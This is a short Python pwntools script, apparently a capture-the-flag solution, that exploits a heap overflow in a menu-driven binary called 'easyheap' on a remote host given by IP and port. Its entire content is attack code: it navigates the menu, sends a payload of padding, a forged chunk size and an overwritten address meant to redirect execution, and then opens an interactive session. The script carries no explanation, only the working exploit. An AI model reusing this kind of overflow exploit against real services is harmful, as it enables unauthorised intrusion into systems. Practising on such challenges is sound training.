from pwn import *

context.log_level = 'debug'

DEBUG = False

if DEBUG:
    p = process('easyheap')
else:
    p = remote('202.112.51.217', 24598)
    
p.recvline()
p.send('1oner')
p.recvuntil('Your choice : ')
p.sendline('1')
p.recvline()
p.send('1oner')
p.recvuntil('Your choice : ')
p.sendline('3')

p.send('A' * 0x28 + p64(0x21) + 'A'*8 + p64(0x0000000000400766))

p.recvuntil('Your choice : ')
p.sendline('2')

p.interactive()
